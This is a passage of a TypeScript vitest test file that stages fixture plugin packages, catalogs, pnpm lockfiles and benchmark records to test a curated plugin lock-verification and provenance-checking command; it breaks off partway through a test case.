import { spawnSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { EventEmitter } from 'node:events'
import {
  cpSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  symlinkSync,
  truncateSync,
  unlinkSync,
  writeFileSync,
} from 'node:fs'
import { tmpdir } from 'node:os'
import { basename, dirname, join, resolve } from 'node:path'
import { performance } from 'node:perf_hooks'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { boot, composeEntries, loadProfile } from '@deepseek-ai/dsh-app-boot'
import { load as loadYaml } from 'js-yaml'
import {
  classifyAdmission,
  deriveCandidateStatus,
  loadCuratedCatalog,
  type AdmissionTier,
  type CuratedCandidate,
  type CuratedCandidateStatus,
  type CuratedRuntimeActivationEvidenceSet,
} from '@deepseek-ai/dsh-curated-policy'
import {
  CURATED_PROFILE_TEMPLATES,
  materializeCuratedProfile,
  type CuratedProfileName,
} from '@deepseek-ai/dsh-curated-profiles'
import {
  createInstalledArtifactResolver,
  createSmokeProfileChildRunner,
  inspectSmokeProfileStaging,
  runCompareBenchmark,
  runPreflight,
  runSmokeProfile,
  runVerifyLock as runVerifyLockCommand,
  type BenchmarkComparison,
  type CommandResult,
  type ResolvedCandidateArtifact,
  type SmokeProfileReport,
  type SmokeProfileRunner,
  type SmokeProfileRunnerRequest,
  type SmokeProfileStagingInput,
  type VerifyLockOptions,
} from '../src/index.ts'
import { runCuratedCommand } from '../src/bin.ts'
import * as curatedScriptsInvariant from '../src/invariant.ts'
import {
  curatedBenchBaselinesDir,
  curatedBenchManifestsDir,
  curatedBenchTasksDir,
} from '../../curated-bench/src/index.ts'
import * as curatedBenchInvariant from '../../curated-bench/src/invariant.ts'
import { bootCuratedBehaviorProfile, type CuratedFixtureContentBlock } from '../../curated-profiles/tests/fixtures/behavior-profile.ts'
import {
  fixtureRepositoryPath,
  SUBDIRECTORY_FIXTURE_PACKAGE,
  writeLocalGitProfileFixture,
} from './fixtures/local-git-profile.ts'

const packageRoot = fileURLToPath(new URL('..', import.meta.url))
const fixtureCommitA = '0123456789abcdef0123456789abcdef01234567'
const fixtureCommitB = '89abcdef012345670123456789abcdef01234567'
const fixtureCommitC = 'abcdef012345670123456789abcdef0123456789'
const fixtureShaA = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'
const fixtureShaB = '89abcdef012345670123456789abcdef0123456789abcdef0123456701234567'
const fixtureShaC = 'abcdef012345670123456789abcdef0123456789abcdef012345670123456789'
const fixtureNpmIntegrity =
  'sha512-wmFfSlWDE3ujFuBSY1W8s2gERSotHD4ueelg5BJ5Hd2/ssB5x24xEaQdbMzNhoAaUjpXeIwfOUdn+nLqHjiYGQ=='
const defaultFixtureTreeSha = '16deef5d84230c990d9d01d1427693b5fc33a43afe28c11f6f88949a9f39c903'
const emptyRuntimeDependencyClosureSha = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
const fixtureRuntimeDependencyClosureSha = '0da8d4982dcbdaa13d039188413bf2dadb5bc3c1b9d6042551556675d34394fc'
function fixtureRuntimeActivationEvidenceSet(
  requiredRuntimeBundles: readonly string[] = [],
): CuratedRuntimeActivationEvidenceSet {
  return {
    keylessAssembledSnapshot: { path: 'evidence/assembled.json', sha256: fixtureShaA },
    requiredRuntimeBundles,
    install: { path: 'evidence/install.json', sha256: fixtureShaB },
    enable: { path: 'evidence/enable.json', sha256: fixtureShaC },
    restart: { path: 'evidence/restart.json', sha256: fixtureShaA },
    disableOrUninstall: { path: 'evidence/disable.json', sha256: fixtureShaB },
  }
}

function fixtureRuntimeActivationEvidenceFor(
  targetProfiles: readonly string[],
  requiredRuntimeBundles: readonly string[] = [],
): NonNullable<CuratedCandidate['runtimeActivationEvidence']> {
  return Object.fromEntries(targetProfiles.map(profile => [
    profile,
    fixtureRuntimeActivationEvidenceSet(requiredRuntimeBundles),
  ]))
}

const fixtureRuntimeActivationEvidence = fixtureRuntimeActivationEvidenceFor(['web-curated'])
const benchmarkEnvironment = {
  model: 'deepseek-chat',
  prompt: 'prompt-v1',
  workspace: 'fixture-workspace',
  network: 'online',
  seed: 7,
} as const
const benchmarkBuild = {
  dshVersion: '0.1.1-rc.2',
  sourceRevision: fixtureCommitA,
  sourceTreeSha256: fixtureShaA,
  sourceDirty: false,
  artifactSha256: fixtureShaB,
  nodeVersion: '22.19.0',
} as const
const benchmarkMeasurement = {
  producer: 'dsh-benchmark-producer@1.0.0',
  tokenizer: 'deepseek-chat-tokenizer@1.0.0',
  serialization: 'dsh-request-json@1.0.0',
  timing: 'node-performance@22.19.0',
  pricing: 'deepseek-pricing@2026-08-25',
  scoring: 'curated-rubric@1.0.0',
} as const

function admittedCandidate(id: string): CuratedCandidate {
  const candidate = loadCuratedCatalog().candidates.find(candidate => candidate.id === id)
  if (candidate === undefined) throw new Error(`missing fixture candidate ${id}`)
  return {
    ...candidate,
    active: true,
    rejections: [],
    targetProfiles: ['web-curated'],
    requiredRuntimeBundles: [],
    runtimeActivationEvidence: fixtureRuntimeActivationEvidence,
  }
}
const previousLockSnapshot = {
  schemaVersion: 2,
  kind: 'curated-lock-snapshot',
  profile: 'web',
  candidates: [{
    id: 'plugin-a',
    expectedPackage: 'plugin-a',
    bundlePatch: './cordis.patch.yml',
    sourceContentSha256: fixtureShaA,
    treeSha256: defaultFixtureTreeSha,
    runtimeDependencyClosureSha256: emptyRuntimeDependencyClosureSha,
    installSource: {
      kind: 'git',
      repository: 'https://github.com/example/plugin-a',
      commit: fixtureCommitB,
      repositoryPath: null,
      installScripts: {},
    },
  }],
} as const
const previousProfileSnapshot = {
  schemaVersion: 2,
  kind: 'curated-profile-snapshot',
  profile: 'web',
  bundles: ['@deepseek-ai/dsh-base', '@deepseek-ai/dsh-web-app'],
} as const

interface MutableBenchmarkFixture {
  schemaVersion: number
  evidenceKind: string
  pendingCampaigns?: unknown
  requiredCriticalTaskIds: unknown
  previousSnapshots: {
    lock: { sha256: string; snapshot: Record<string, unknown> }
    profile: { sha256: string; snapshot: Record<string, unknown> }
  }
  baseline: {
    profile: string
    execution: {
      id: string
      startedAt: string
      environment: Record<string, unknown>
      build: Record<string, unknown>
      measurement: Record<string, unknown>
    }
    lockSnapshot: { path: string; sha256: string }
    profileSnapshot: { path: string; sha256: string }
    runs: Array<Record<string, unknown>>
  }
  candidate: {
    profile: string
    execution: {
      id: string
      startedAt: string
      environment: Record<string, unknown>
      build: Record<string, unknown>
      measurement: Record<string, unknown>
    }
    lockSnapshot: { path: string; sha256: string }
    profileSnapshot: { path: string; sha256: string }
    runs: Array<Record<string, unknown>>
  }
}

afterEach(() => {
  vi.doUnmock('node:fs')
  vi.doUnmock('@deepseek-ai/dsh-curated-policy')
  vi.resetModules()
})

function tempFile(name: string, content: string): string {
  const dir = mkdtempSync(join(tmpdir(), 'dsh-curated-scripts-'))
  const path = join(dir, name)
  writeFileSync(path, stageBenchmarkSnapshotReferences(dir, content))
  return path
}

function stageBenchmarkSnapshotReferences(dir: string, content: string): string {
  let fixture: Record<string, unknown>
  try {
    fixture = JSON.parse(content) as Record<string, unknown>
  } catch {
    return content
  }
  const previousSnapshots = fixture.previousSnapshots as {
    lock?: { snapshot?: unknown }
    profile?: { snapshot?: unknown }
  } | undefined
  const baseline = fixture.baseline as {
    profile?: unknown
    lockSnapshot?: unknown
    profileSnapshot?: unknown
  } | undefined
  const candidate = fixture.candidate as {
    profile?: unknown
    lockSnapshot?: unknown
    profileSnapshot?: unknown
  } | undefined
  const writes = [
    [baseline?.lockSnapshot, previousSnapshots?.lock?.snapshot],
    [baseline?.profileSnapshot, previousSnapshots?.profile?.snapshot],
    [candidate?.lockSnapshot, {
      schemaVersion: 2,
      kind: 'curated-lock-snapshot',
      profile: candidate?.profile,
      candidates: [],
    }],
    [candidate?.profileSnapshot, {
      schemaVersion: 2,
      kind: 'curated-profile-snapshot',
      profile: candidate?.profile,
      bundles: candidate?.profile === 'web-curated'
        ? [...CURATED_PROFILE_TEMPLATES['web-curated'].bundles]
        : ['@deepseek-ai/dsh-base'],
    }],
  ] as const
  for (const [value, snapshot] of writes) {
    const reference = value as { path?: unknown; sha256?: unknown } | undefined
    if (
      typeof reference?.path !== 'string'
      || !/^(?!\/)(?!.*(?:^|\/)\.\.(?:\/|$))(?!.*\\).+\.json$/u.test(reference.path)
      || snapshot === undefined
    ) continue
    const sha256 = createHash('sha256').update(canonicalJson(snapshot)).digest('hex')
    if (isRecordForFixture(value)) Reflect.set(value, 'sha256', sha256)
    const snapshotPath = join(dir, ...reference.path.split('/'))
    mkdirSync(dirname(snapshotPath), { recursive: true })
    writeFileSync(snapshotPath, `${JSON.stringify(snapshot, null, 2)}\n`)
  }
  return JSON.stringify(fixture)
}

function isRecordForFixture(value: unknown): value is Record<string, unknown> {
  return typeof value === 'object' && value !== null && !Array.isArray(value)
}

function cleanup(path: string): void {
  rmSync(resolve(path, '..'), { recursive: true, force: true })
}

function stageCandidateArtifact(packageName: string, manifestOverrides: Record<string, unknown> = {}): string {
  const root = mkdtempSync(join(tmpdir(), 'dsh-curated-artifact-'))
  stageCandidatePackage(root, packageName, undefined, manifestOverrides)
  return root
}

function stageCandidatePackage(
  root: string,
  packageName: string,
  patch?: string,
  manifestOverrides: Record<string, unknown> = {},
  pluginSource = [
    'globalThis.__dshCuratedArtifactLoads = (globalThis.__dshCuratedArtifactLoads ?? 0) + 1',
    'export const name = "fixture-candidate"',
    'export const inject = []',
    'export function apply() {}',
    '',
  ].join('\n'),
  candidateOverride?: CuratedCandidate,
): string {
  const rootManifest = existsSync(join(root, 'package.json'))
    ? JSON.parse(readFileSync(join(root, 'package.json'), 'utf8')) as {
      dsh?: { profile?: { bundles?: unknown[] } }
    }
    : undefined
  const isManagedCandidate = rootManifest?.dsh?.profile?.bundles?.includes(packageName) === true
  const candidate = candidateOverride
    ?? (isManagedCandidate
      ? loadCuratedCatalog().candidates.find(current => current.expectedPackage === packageName)
      : undefined)
  if (rootManifest !== undefined && !Object.hasOwn(rootManifest, 'name')) {
    const profile = candidate?.targetProfiles[0]
      ?? (basename(dirname(root)) === 'profiles' ? basename(root) : 'custom-curated')
    Reflect.set(rootManifest, 'name', `dsh-profile-${profile}`)
    writeFileSync(join(root, 'package.json'), JSON.stringify(rootManifest))
  }
  if (rootManifest !== undefined && !existsSync(join(root, '.npmrc'))) {
    writeFileSync(join(root, '.npmrc'), 'ignore-scripts=true\n')
  }
  const patchContent = patch ?? `- insert:
${(candidate?.resources?.entryIds ?? ['dsh-toolkit'])
  .map(id => `    - id: ${id}\n      name: ./plugin.mjs`)
  .join('\n')}
`
  const packageDir = join(root, 'node_modules', packageName)
  mkdirSync(packageDir, { recursive: true })
  writeFileSync(join(packageDir, 'package.json'), JSON.stringify({
    name: packageName,
    version: candidate?.npmVersion ?? '1.0.0',
    type: 'module',
    main: './plugin.mjs',
    exports: {
      '.': './plugin.mjs',
      './package.json': './package.json',
    },
    ...candidate?.nodeEngine === null ? {} : { engines: { node: candidate?.nodeEngine ?? '^22.19.0 || >=24.0.0' } },
    license: candidate?.license ?? 'MIT',
    scripts: candidate?.installScripts ?? {},
    ...candidate === undefined || candidate.externalDependencies.length === 0
      ? {}
      : { dependencies: Object.fromEntries(candidate.externalDependencies.map(name => [name, '*'])) },
    dsh: { bundle: { patch: './cordis.patch.yml' } },
    ...manifestOverrides,
  }))
  writeFileSync(join(packageDir, 'plugin.mjs'), pluginSource)
  writeFileSync(join(packageDir, 'cordis.patch.yml'), patchContent)
  writeFileSync(join(packageDir, '.dsh-curated-artifact.json'), JSON.stringify({
    repository: candidate?.repository ?? 'https://github.com/example/plugin-a',
    commit: candidate?.commit ?? fixtureCommitB,
    sourceContentSha256: candidate?.sourceContentSha256 ?? fixtureShaA,
    changedPaths: ['package.json', 'cordis.patch.yml', 'plugin.mjs'],
  }))
  if (candidateOverride !== undefined && !Object.isFrozen(candidateOverride)) {
    Reflect.set(candidateOverride, 'treeSha256', fixtureTreeSha256(packageDir))
    Reflect.set(candidateOverride, 'runtimeDependencyClosureSha256', emptyRuntimeDependencyClosureSha)
  }
  if (candidate !== undefined) stageManagedPnpmEvidence(root, candidate)
  return packageDir
}

function fixtureArtifactResolver(roots: readonly string[]): {
  resolve(candidate: CuratedCandidate): ResolvedCandidateArtifact | undefined
} {
  return {
    resolve(candidate) {
      if (candidate.expectedPackage === null) return undefined
      for (const root of roots) {
        const packageDir = join(root, 'node_modules', candidate.expectedPackage)
        if (!existsSync(join(packageDir, 'package.json'))) continue
        const recordPath = join(packageDir, '.dsh-curated-artifact.json')
        const record = existsSync(recordPath)
          ? JSON.parse(readFileSync(recordPath, 'utf8')) as {
            repository?: string
            commit?: string
            sourceContentSha256?: string
            changedPaths?: string[]
          }
          : {}
        return {
          packageDir,
          repository: record.repository ?? candidate.repository,
          commit: record.commit ?? candidate.commit,
          ...(record.sourceContentSha256 ?? candidate.sourceContentSha256) === undefined
            ? {}
            : { sourceContentSha256: record.sourceContentSha256 ?? candidate.sourceContentSha256 },
          changedPaths: record.changedPaths ?? [],
        }
      }
      return undefined
    },
  }
}

function stageEmptyManagedPnpmEvidence(root: string): void {
  const lock = JSON.stringify({
    lockfileVersion: '9.0',
    importers: { '.': { dependencies: {} } },
    packages: {},
  })
  writeFileSync(join(root, 'pnpm-lock.yaml'), lock)
  mkdirSync(join(root, 'node_modules/.pnpm'), { recursive: true })
  writeFileSync(join(root, 'node_modules/.pnpm/lock.yaml'), lock)
}

function stageManagedPnpmEvidence(root: string, candidate: CuratedCandidate): void {
  const manifestPath = join(root, 'package.json')
  if (!existsSync(manifestPath) || candidate.expectedPackage === null) return
  const manifest = JSON.parse(readFileSync(manifestPath, 'utf8')) as {
    dependencies?: Record<string, string>
    dsh?: { profile?: { bundles?: unknown[] } }
  }
  if (!manifest.dsh?.profile?.bundles?.includes(candidate.expectedPackage)) return
  const repository = candidate.repository.endsWith('.git') ? candidate.repository : `${candidate.repository}.git`
  const dependencySpec = candidate.npmVersion
    ?? (`git+${repository}#${candidate.commit}`
      + (candidate.repositoryPath === null ? '' : `&path:${candidate.repositoryPath}`))
  manifest.dependencies = { ...manifest.dependencies, [candidate.expectedPackage]: dependencySpec }
  writeFileSync(manifestPath, JSON.stringify(manifest))
  const lockPath = join(root, 'pnpm-lock.yaml')
  type FixtureLock = {
    lockfileVersion: string
    importers: { '.': { dependencies: Record<string, unknown> } }
    packages: Record<string, unknown>
  }
  const lock: FixtureLock = existsSync(lockPath)
    ? JSON.parse(readFileSync(lockPath, 'utf8')) as FixtureLock
    : {
      lockfileVersion: '9.0',
      importers: { '.': { dependencies: {} } },
      packages: {},
    }
  const version = dependencySpec
  lock.importers['.'].dependencies[candidate.expectedPackage] = {
    specifier: dependencySpec,
    version,
  }
  lock.packages[`${candidate.expectedPackage}@${version}`] = candidate.npmVersion === undefined
    ? {
      resolution: {
        type: 'git',
        repo: repository,
        commit: candidate.commit,
        ...candidate.repositoryPath === null ? {} : { path: candidate.repositoryPath },
      },
      version: '1.0.0',
    }
    : {
      resolution: { integrity: candidate.npmIntegrity },
    }
  const lockContent = JSON.stringify(lock)
  writeFileSync(lockPath, lockContent)
  mkdirSync(join(root, 'node_modules/.pnpm'), { recursive: true })
  writeFileSync(join(root, 'node_modules/.pnpm/lock.yaml'), lockContent)
}

function artifactCatalog(candidateOverrides: Record<string, unknown> = {}): string {
  const evidenceProfiles = Array.isArray(candidateOverrides.targetProfiles)
    && candidateOverrides.targetProfiles.every(profile => typeof profile === 'string')
    ? candidateOverrides.targetProfiles
    : ['web-curated']
  return JSON.stringify({
    schemaVersion: 2,
    source: {
      awesome: {
        repository: 'https://github.com/example/awesome',
        commit: fixtureCommitA,
        file: 'README.md',
      },
      matrix: 'docs/plugin/superpowers/02-插件矩阵与择优.md',
    },
    candidates: [{
      id: 'plugin-a',
      priority: 'P0',
      capability: 'web-search',
      score: 88,
      scoreDimensions: {
        nativeCompatibility: 18,
        functionalCompleteness: 14,
        testAndCi: 14,
        securityAndPrivacy: 14,
        maintenanceHealth: 8,
        performanceCost: 8,
        operability: 8,
        communitySignal: 4,
      },
      repository: 'https://github.com/example/plugin-a',
      repositoryPath: null,
      commit: fixtureCommitB,
      sourceStatus: 'verified',
      auditedAt: '2026-08-25',
      manifestPath: 'package.json',
      expectedPackage: 'plugin-a',
      nodeEngine: '^22.19.0 || >=24.0.0',
      nodeEngineEvidence: 'package.json#engines.node',
      requiresCorePatch: false,
      license: 'MIT',
      bundlePatch: './cordis.patch.yml',
      sourceContentSha256: fixtureShaA,
      treeSha256: defaultFixtureTreeSha,
      runtimeDependencyClosureSha256: emptyRuntimeDependencyClosureSha,
      testFiles: 1,
      ciWorkflows: 1,
      installScripts: {},
      externalDependencies: [],
      requiredRuntimeBundles: [],
      networkAccess: [],
      credentials: [],
      targetProfiles: evidenceProfiles,
      active: true,
      auditWarnings: [],
      resources: { entryIds: ['dsh-toolkit'] },
      rejections: [],
      runtimeActivationEvidence: fixtureRuntimeActivationEvidenceFor(evidenceProfiles),
      ...candidateOverrides,
    }],
  })
}

function artifactCandidate(candidateOverrides: Record<string, unknown> = {}): CuratedCandidate {
  const parsed = JSON.parse(artifactCatalog(candidateOverrides)) as { candidates: CuratedCandidate[] }
  return parsed.candidates[0] as CuratedCandidate
}

function catalog(
  candidatePatch: string,
  options: {
    readonly sourceCommit?: string
    readonly candidateCommit?: string
    readonly sourceContentSha256?: string
  } = {},
): string {
  return `schemaVersion: 2
source:
  awesome:
    repository: https://github.com/example/awesome
    commit: "${options.sourceCommit ?? fixtureCommitA}"
    file: README.md
  matrix: docs/plugin/superpowers/02-插件矩阵与择优.md
candidates:
  - id: plugin-a
    priority: P0
    capability: web-search
    score: 88
    scoreDimensions: &fixtureScoreDimensions
      nativeCompatibility: 18
      functionalCompleteness: 14
      testAndCi: 14
      securityAndPrivacy: 14
      maintenanceHealth: 8
      performanceCost: 8
      operability: 8
      communitySignal: 4
    repository: https://github.com/example/plugin-a
    repositoryPath: null
    commit: "${options.candidateCommit ?? fixtureCommitB}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-a
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    sourceContentSha256: "${options.sourceContentSha256 ?? fixtureShaA}"
    treeSha256: "${defaultFixtureTreeSha}"
    runtimeDependencyClosureSha256: "${emptyRuntimeDependencyClosureSha}"
    testFiles: 1
    ciWorkflows: 1
    installScripts: {}
    externalDependencies: []
    requiredRuntimeBundles: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-curated]
    active: true
    auditWarnings: []
    rejections: []
    runtimeActivationEvidence:
      web-curated: &fixtureRuntimeActivationEvidenceSet
        keylessAssembledSnapshot: {path: evidence/assembled.json, sha256: "${fixtureShaA}"}
        requiredRuntimeBundles: []
        install: {path: evidence/install.json, sha256: "${fixtureShaB}"}
        enable: {path: evidence/enable.json, sha256: "${fixtureShaC}"}
        restart: {path: evidence/restart.json, sha256: "${fixtureShaA}"}
        disableOrUninstall: {path: evidence/disable.json, sha256: "${fixtureShaB}"}
${candidatePatch}`
}

function runNode(script: string, args: readonly string[]): CommandResult {
  const result = spawnSync(process.execPath, [resolve(packageRoot, script), ...args], {
    encoding: 'utf8',
    timeout: 15000,
  })
  return {
    status: result.status ?? 125,
    stdout: result.stdout,
    stderr: result.stderr,
  }
}

function benchmarkFixture(additionalCandidateRuns: readonly Record<string, unknown>[] = []): string {
  const additionalBaselineRuns = additionalCandidateRuns.flatMap(run => repeatedBenchmarkRuns({
    taskId: run.taskId,
  }))
  const repeatedAdditionalCandidateRuns = additionalCandidateRuns.flatMap(run => repeatedBenchmarkRuns(run))
  return JSON.stringify({
    schemaVersion: 3,
    evidenceKind: 'observed',
    requiredCriticalTaskIds: ['a', 'b', 'c'],
    previousSnapshots: {
      lock: snapshotEnvelope(previousLockSnapshot),
      profile: snapshotEnvelope(previousProfileSnapshot),
    },
    baseline: {
      profile: 'web',
      execution: {
        id: 'baseline-execution',
        startedAt: '2026-08-25T00:00:00.000Z',
        environment: benchmarkEnvironment,
        build: benchmarkBuild,
        measurement: benchmarkMeasurement,
      },
      lockSnapshot: { path: 'locks/web.json', sha256: fixtureShaA },
      profileSnapshot: { path: 'profiles/web.json', sha256: fixtureShaA },
      runs: [
        ...repeatedBenchmarkRuns({ taskId: 'a', success: true, firstTokenMs: 100, promptTokens: 50, schemaTokens: 50, costUsd: 1 }),
        ...repeatedBenchmarkRuns({ taskId: 'b', success: true, firstTokenMs: 200, promptTokens: 50, schemaTokens: 50, costUsd: 1 }),
        ...repeatedBenchmarkRuns({ taskId: 'c', success: false, firstTokenMs: 300, promptTokens: 50, schemaTokens: 50, costUsd: 1, failure: 'timeout' }),
        ...additionalBaselineRuns,
      ],
    },
    candidate: {
      profile: 'web-curated',
      execution: {
        id: 'candidate-execution',
        startedAt: '2026-08-25T00:05:00.000Z',
        environment: benchmarkEnvironment,
        build: benchmarkBuild,
        measurement: benchmarkMeasurement,
      },
      lockSnapshot: { path: 'locks/web-curated.json', sha256: fixtureShaA },
      profileSnapshot: { path: 'profiles/web-curated.json', sha256: fixtureShaA },
      runs: [
        ...repeatedBenchmarkRuns({ taskId: 'a', success: true, firstTokenMs: 10, promptTokens: 40, schemaTokens: 40, costUsd: 0.4 }),
        ...repeatedBenchmarkRuns({ taskId: 'b', success: true, firstTokenMs: 20, promptTokens: 50, schemaTokens: 50, costUsd: 0.5 }),
        ...repeatedBenchmarkRuns({ taskId: 'c', success: false, firstTokenMs: 30, promptTokens: 60, schemaTokens: 60, costUsd: 0.6, failure: 'timeout' }),
        ...repeatedAdditionalCandidateRuns,
      ],
    },
  })
}

function repeatedBenchmarkRuns(overrides: Record<string, unknown>): Record<string, unknown>[] {
  return Array.from({ length: 5 }, (_, index) => benchmarkRun({ ...overrides, attempt: index + 1 }))
}

function benchmarkRun(overrides: Record<string, unknown>): Record<string, unknown> {
  const run: Record<string, unknown> = {
    taskId: 'task',
    attempt: 1,
    critical: true,
    startupSucceeded: true,
    dataLossEvents: 0,
    rollbackSupported: true,
    success: true,
    failure: null,
    quality: 80,
    securityCorrectness: 96,
    reliability: 90,
    performanceCost: 70,
    operationExperience: 60,
    upgradeCompatibility: 100,
    firstTokenMs: 100,
    promptTokens: 50,
    schemaTokens: 50,
    costUsd: 1,
    ...overrides,
  }
  if (run.success === false && !Object.hasOwn(overrides, 'failure')) run.failure = 'failure'
  return run
}

function snapshotEnvelope(snapshot: Record<string, unknown>): { readonly sha256: string; readonly snapshot: Record<string, unknown> } {
  return {
    sha256: createHash('sha256').update(canonicalJson(snapshot)).digest('hex'),
    snapshot,
  }
}

function canonicalJson(value: unknown): string {
  if (value === null || typeof value === 'string' || typeof value === 'boolean' || typeof value === 'number') {
    return JSON.stringify(value)
  }
  if (Array.isArray(value)) return `[${value.map(item => canonicalJson(item)).join(',')}]`
  const record = value as Record<string, unknown>
  return `{${Object.keys(record)
    .sort()
    .map(key => `${JSON.stringify(key)}:${canonicalJson(record[key])}`)
    .join(',')}}`
}

function fixtureTreeSha256(packageDir: string): string {
  const files: string[] = []
  const visit = (directory: string, relativeDirectory = ''): void => {
    for (const entry of readdirSync(directory, { withFileTypes: true })) {
      const relativePath = relativeDirectory.length === 0
        ? entry.name
        : `${relativeDirectory}/${entry.name}`
      if (entry.isDirectory()) {
        visit(join(directory, entry.name), relativePath)
      } else if (entry.isFile()) {
        files.push(relativePath)
      }
    }
  }
  visit(packageDir)
  const digest = createHash('sha256')
  for (const relativePath of files.sort()) {
    const pathBytes = Buffer.from(relativePath)
    const content = readFileSync(join(packageDir, ...relativePath.split('/')))
    digest.update(`${String(pathBytes.byteLength)}:`)
    digest.update(pathBytes)
    digest.update(`${String(content.byteLength)}:`)
    digest.update(content)
  }
  return digest.digest('hex')
}

function writeFixtureTreeSha(catalogPath: string, packageDir: string): void {
  const catalog = loadYaml(readFileSync(catalogPath, 'utf8')) as {
    candidates: Array<{ treeSha256?: string }>
  }
  const candidate = catalog.candidates[0]
  if (candidate === undefined) throw new Error('fixture catalog has no candidate')
  candidate.treeSha256 = fixtureTreeSha256(packageDir)
  writeFileSync(catalogPath, JSON.stringify(catalog))
}

function runVerifyLock(args: readonly string[], options: VerifyLockOptions = {}): CommandResult {
  const fixtureFlag = args.findIndex(arg => arg === '--fixture')
  const fixtureArg = args.find(arg => arg.startsWith('--fixture='))
  const fixturePath = fixtureFlag === -1 ? fixtureArg?.slice('--fixture='.length) : args[fixtureFlag + 1]
  const roots = [
    ...args.flatMap((arg, index) => arg === '--artifact-root' ? [args[index + 1]] : [])
      .filter((root): root is string => root !== undefined),
    ...args.filter(arg => arg.startsWith('--artifact-root=')).map(arg => arg.slice('--artifact-root='.length)),
    ...(options.artifactRoots ?? []),
  ]
  if (fixturePath !== undefined && roots.length > 0) {
    const fixture = loadYaml(readFileSync(fixturePath, 'utf8')) as {
      candidates?: Array<{ active?: boolean; expectedPackage?: string; treeSha256?: string }>
    }
    let changed = false
    for (const candidate of fixture.candidates ?? []) {
      if (!candidate.active || candidate.treeSha256 !== defaultFixtureTreeSha) continue
      for (const root of roots) {
        const packageDir = join(root, 'node_modules', candidate.expectedPackage ?? '')
        if (!existsSync(packageDir)) continue
        candidate.treeSha256 = fixtureTreeSha256(packageDir)
        changed = true
        break
      }
    }
    if (changed) writeFileSync(fixturePath, JSON.stringify(fixture))
  }
  return runVerifyLockCommand(args, {
    ...options,
    ...options.artifactResolver !== undefined || roots.length === 0
      ? {}
      : { artifactResolver: fixtureArtifactResolver(roots) },
  })
}

function commandIssues(result: CommandResult): Array<{ code: string; target?: string; message: string }> {
  return (JSON.parse(result.stdout) as {
    issues: Array<{ code: string; target?: string; message: string }>
  }).issues
}

async function commandsWithCatalogCandidates(
  candidates: readonly CuratedCandidate[],
): Promise<typeof import('../src/index.ts')> {
  vi.resetModules()
  vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
    const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
      '@deepseek-ai/dsh-curated-policy',
    )
    const source = actual.loadCuratedCatalog().source
    return {
      ...actual,
      loadCuratedCatalog: (path?: string) => path === undefined
        ? { schemaVersion: 1, source, candidates }
        : actual.loadCuratedCatalog(path),
    }
  })
  return import('../src/index.ts')
}

describe('verify-lock command', () => {
  it('requires both lockfiles for an observed zero-candidate curated profile', () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-zero-candidate-locks-'))
    const profileRoot = materializeCuratedProfile('web-curated', home)
    try {
      for (const command of [
        () => runVerifyLockCommand(['--artifact-root', profileRoot, '--json']),
        () => runPreflight(['--profile', 'web-curated', '--profile-root', profileRoot, '--json']),
      ]) {
        const result = command()
        expect(result.status).toBe(1)
        const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string }> }
        expect(payload.issues[0]?.code).toMatch(/locks-missing|input-invalid/u)
        expect(result.stdout).toContain('requires root and installed pnpm lockfiles')
      }

      stageEmptyManagedPnpmEvidence(profileRoot)
      expect(runVerifyLockCommand(['--artifact-root', profileRoot, '--json']).status).toBe(0)
      expect(runPreflight([
        '--profile',
        'web-curated',
        '--profile-root',
        profileRoot,
        '--json',
      ]).status).toBe(0)
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('validates exactly the active candidates assigned to each managed profile', () => {
    const catalog = loadCuratedCatalog()
    const profileNames = Object.keys(CURATED_PROFILE_TEMPLATES) as CuratedProfileName[]

    for (const profileName of profileNames) {
      const home = mkdtempSync(join(tmpdir(), `dsh-curated-${profileName}-verify-`))
      try {
        const profileRoot = materializeCuratedProfile(profileName, home)
        stageEmptyManagedPnpmEvidence(profileRoot)
        const fixtureCatalog = {
          ...catalog,
          candidates: catalog.candidates.map(candidate => ({ ...candidate })),
        }
        const candidates = fixtureCatalog.candidates.filter(candidate =>
          candidate.active
          && candidate.expectedPackage !== null
          && candidate.targetProfiles.includes(profileName))
        for (const candidate of candidates) {
          const patch = candidate.id === 'dsh-permission-rules'
            ? `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      config:
        badFilePolicy: fail
        enforce: true
`
            : undefined
          stageCandidatePackage(
            profileRoot,
            candidate.expectedPackage as string,
            patch,
            {},
            undefined,
            candidate,
          )
        }
        const catalogPath = join(home, 'catalog.json')
        writeFileSync(catalogPath, JSON.stringify(fixtureCatalog))

        const result = runVerifyLock([
          '--fixture',
          catalogPath,
          '--artifact-root',
          profileRoot,
          '--json',
        ])

        expect(JSON.parse(result.stdout), profileName).toMatchObject({
          ok: true,
          observed: true,
          provenanceScope: 'managed-profile',
          catalogCandidateCount: catalog.candidates.length,
          selectedCandidateCount: candidates.length,
          issues: [],
        })
        expect(JSON.parse(result.stdout), profileName).not.toHaveProperty('candidateCount')
      } finally {
        rmSync(home, { recursive: true, force: true })
      }
    }
  })

  it('rejects a canonical built-in managed profile that drifts from its template', () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-verify-template-'))
    try {
      const profileRoot = materializeCuratedProfile('web-personal', home)
      stageEmptyManagedPnpmEvidence(profileRoot)
      const manifestPath = join(profileRoot, 'package.json')
      const manifest = JSON.parse(readFileSync(manifestPath, 'utf8')) as {
        dsh: { profile: { bundles: string[] } }
      }
      manifest.dsh.profile.bundles.push('@deepseek-ai/dsh-headless')
      writeFileSync(manifestPath, JSON.stringify(manifest))

      const result = runVerifyLockCommand(['--artifact-root', profileRoot, '--json'])

      expect(result.status).toBe(1)
      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
